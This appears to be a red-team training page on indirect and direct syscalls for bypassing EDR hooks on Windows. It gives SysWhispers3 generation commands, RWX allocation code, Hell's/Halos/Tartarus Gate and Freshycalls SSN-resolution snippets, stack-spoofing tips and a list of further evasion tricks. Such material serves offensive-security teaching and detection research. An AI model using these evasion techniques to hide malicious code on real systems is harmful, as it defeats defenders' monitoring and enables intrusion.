---
layout: training-page
title: "Indirect Syscalls — Red Team Academy"
module: "Evasion"
tags:
  - syscalls
  - syswhispers
  - hell-s-gate
  - nt-api
  - edr-bypass
page_key: "evasion-indirect-syscalls"
render_with_liquid: false
---

# Indirect Syscalls

EDR products hook NTAPI functions (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) in ntdll.dll to intercept malicious calls. Direct and indirect syscalls bypass these hooks by invoking system calls directly via the CPU int 0x2e/syscall instruction, skipping userland hooks entirely. Indirect syscalls use the syscall instruction from within ntdll itself to evade stack-based detections.

## How Syscalls Work

```
; Windows syscall stub (ntdll.dll):
; NtAllocateVirtualMemory:
mov r10, rcx           ; copy first argument
mov eax, 0x18          ; syscall number (SSN)
syscall                ; kernel transition
ret

; EDR hook (inline hook):
; NtAllocateVirtualMemory:
jmp 0x...EDR_HOOK...   ; trampoline to EDR code ← intercept here

; Direct syscall bypass:
; Copy the mov eax, SSN + syscall instructions to your own stub
; Execute from your shellcode → bypasses userland hook

; Indirect syscall bypass:
; Set up registers as if calling NT function
; JMP to the syscall instruction INSIDE ntdll.dll
; EDR sees syscall originating from ntdll (legitimate address)
; Stack still shows your code called ntdll
```

## SysWhispers3 — Syscall Header Generator

```
# SysWhispers3 generates MASM/NASM syscall stubs:
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
pip3 install -r requirements.txt

# Generate stubs for specific functions:
python3 syswhispers.py \
  --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx \
  --output syscalls \
  --arch x64

# Output files: syscalls.h, syscalls.c, syscallsstubs.asm

# Modes:
python3 syswhispers.py --functions NtAllocateVirtualMemory \
  --output syscalls \
  --syscall-instruction syscall    # direct syscall

python3 syswhispers.py --functions NtAllocateVirtualMemory \
  --output syscalls \
  --jmp-obfuscation         # randomize jmp location for indirect

# Compile with Visual Studio:
# Add syscalls.h, syscalls.c, syscallsstubs.asm to project
# Right-click project → Build Customizations → Enable MASM
# syscallsstubs.asm: Properties → MASM → Yes

# Usage in C code:
#include "syscalls.h"
HANDLE hProcess = GetCurrentProcess();
PVOID baseAddress = NULL;
SIZE_T regionSize = 0x1000;
NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

## Hell's Gate — Dynamic SSN Resolution

```
/* Hell's Gate: dynamically reads SSN from ntdll at runtime
   Avoids hardcoded syscall numbers (SSNs vary by Windows version)
   Works even if ntdll is hooked — reads bytes around the hook */

// Hell's Gate implementation concept:
// 1. Load ntdll.dll from disk (clean copy, not hooked memory)
// 2. Parse PE exports to find NT function address
// 3. Read syscall stub: look for "mov eax, XX" pattern
// 4. Extract SSN (XX value)
// 5. Execute syscall directly

// Halos Gate (extension): handles hooked stubs
// If first bytes are a jmp (EDR hook), walk neighboring functions
// to find an unhooked stub, calculate SSN by offset

// Tartarus Gate: handles fully hooked ntdll
// Maps a fresh ntdll from \KnownDlls\ntdll.dll or from disk

// Example: reading SSN from ntdll
PVOID pNtAlloc = GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
// Check if hooked (first bytes = 0xE9 = jmp):
if (*(BYTE*)pNtAlloc == 0xE9) {
    // Hooked! Use Halos Gate to find nearby unhooked stub
} else {
    // Read: mov r10, rcx (4D 8B D1) + mov eax, SSN (B8 XX XX 00 00)
    DWORD ssn = *(DWORD*)((BYTE*)pNtAlloc + 4);
}

// References:
// Hell's Gate: github.com/am0nsec/HellsGate
// Halos Gate: github.com/trickster0/TartarusGate
// Tartarus Gate: github.com/trickster0/TartarusGate
```

## Freshycalls / Recycled Gate

```
/* Freshycalls: sort all NT stubs by address order
   SSNs are assigned sequentially by address order in ntdll
   → Can compute any SSN from the sorted list without reading it directly */

// Concept:
// 1. Get all NT* export addresses from ntdll
// 2. Sort by address
// 3. SSN = index in sorted list (Zw* and Nt* share SSNs)

// Python implementation sketch:
import pefile, ctypes

ntdll = pefile.PE(r"C:\Windows\System32\ntdll.dll")
nt_funcs = []
for exp in ntdll.DIRECTORY_ENTRY_EXPORT.symbols:
    name = exp.name.decode()
    if name.startswith('Nt') or name.startswith('Zw'):
        nt_funcs.append((exp.address, name))

nt_funcs.sort(key=lambda x: x[0])
for ssn, (addr, name) in enumerate(nt_funcs):
    print(f"SSN {ssn:#04x}: {name}")

# This approach is hook-resistant because it doesn't read
# the stub bytes at all -- just sorts export addresses
```

## Stack Considerations with Indirect Syscalls

```
; Indirect syscall: jump to syscall instruction inside ntdll
; RetAddr on stack points to your code (not ntdll)
; Some EDRs check the return address via stack walking

; Solution: use a trampoline inside ntdll that includes the RET
; So call stack shows: ntdll!KiUserSystemCall → ntdll!NtAllocate...

; SysWhispers3 --jmp-obfuscation handles this by:
; 1. Finding syscall+ret gadget in ntdll
; 2. Jumping to syscall from within ntdll code range
; 3. Return address remains inside ntdll text section

; Alternatively: stack spoofing (see stack-spoofing page)
; combined with indirect syscalls for full evasion
```

## Detection Considerations

```
// What EDRs look for:
// 1. Syscall instruction not in ntdll address range (direct syscalls)
// 2. Return address after syscall points outside ntdll (indirect syscalls)
// 3. Known SSN values for sensitive functions
// 4. System call sequence anomalies (NtOpenProcess → NtAllocate → NtWrite → NtCreate)

// Evasion improvements:
// - Combine with sleep obfuscation (encrypt implant between calls)
// - Use thread pool callbacks to hide call stack origin
// - Add junk API calls between sensitive syscalls
// - Use undocumented/aliased NT functions (NtCreateUserProcess etc.)

// Tools combining techniques:
// BokuLoader — shellcode reflective loader with indirect syscalls
// AceLdr — in-memory loader with syscall support
// Havoc C2 — built-in indirect syscalls in agent
```

## Resources

- SysWhispers3 — `github.com/klezVirus/SysWhispers3`
- Hell's Gate — `github.com/am0nsec/HellsGate`
- Tartarus Gate — `github.com/trickster0/TartarusGate`
- Freshycalls — `github.com/crummie5/FreshyCalls`
- Windows Internals — Mark Russinovich (syscall architecture)
- MDSec — Bypassing User-Mode Hooks blog series
